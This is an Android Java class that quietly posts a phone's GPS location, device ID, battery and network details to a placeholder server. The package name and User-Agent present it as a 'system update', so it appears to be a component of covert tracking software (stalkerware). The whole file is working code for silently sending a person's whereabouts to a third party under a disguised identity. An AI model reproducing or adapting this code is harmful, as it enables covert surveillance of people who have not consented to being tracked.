package com.system.update;

import android.content.Context;
import android.location.Location;
import android.util.Log;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DataSender {
    
    private static final String TAG = "DataSender";
    
    // CAMBIA ESTAS URLS POR TUS ENDPOINTS REALES
    private static final String LOCATION_URL = "https://tu-servidor.com/api/location";
    private static final String DEVICE_URL = "https://tu-servidor.com/api/device";
    
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    
    private OkHttpClient client;
    private DeviceInfo deviceInfo;
    
    public DataSender(Context context) {
        client = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .writeTimeout(15, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        deviceInfo = new DeviceInfo(context);
    }
    
    public void sendLocationData(Location location) {
        if (location == null) return;
        
        String json = createLocationJson(location);
        sendData(LOCATION_URL, json, "location");
    }
    
    public void sendDeviceData() {
        String json = createDeviceJson();
        sendData(DEVICE_URL, json, "device");
    }
    
    private void sendData(String url, String json, String type) {
        RequestBody body = RequestBody.create(json, JSON);
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("User-Agent", "SystemUpdate/1.0")
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Error enviando " + type + ": " + e.getMessage());
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i(TAG, type + " enviado exitosamente");
                } else {
                    Log.e(TAG, "Error en respuesta " + type + ": " + response.code());
                }
                response.close();
            }
        });
    }
    
    private String createLocationJson(Location location) {
        return "{"
                + "\"device_id\": \"" + deviceInfo.getDeviceId() + "\","
                + "\"latitude\": " + location.getLatitude() + ","
                + "\"longitude\": " + location.getLongitude() + ","
                + "\"accuracy\": " + location.getAccuracy() + ","
                + "\"altitude\": " + location.getAltitude() + ","
                + "\"speed\": " + location.getSpeed() + ","
                + "\"bearing\": " + location.getBearing() + ","
                + "\"timestamp\": " + location.getTime() + ","
                + "\"server_timestamp\": " + System.currentTimeMillis()
                + "}";
    }
    
    private String createDeviceJson() {
        return "{"
                + "\"device_id\": \"" + deviceInfo.getDeviceId() + "\","
                + "\"device_model\": \"" + deviceInfo.getDeviceModel() + "\","
                + "\"android_version\": \"" + deviceInfo.getAndroidVersion() + "\","
                + "\"app_version\": \"" + deviceInfo.getAppVersion() + "\","
                + "\"battery_level\": " + deviceInfo.getBatteryLevel() + ","
                + "\"is_charging\": " + deviceInfo.isCharging() + ","
                + "\"network_type\": \"" + deviceInfo.getNetworkType() + "\","
                + "\"timestamp\": " + System.currentTimeMillis()
                + "}";
    }
}
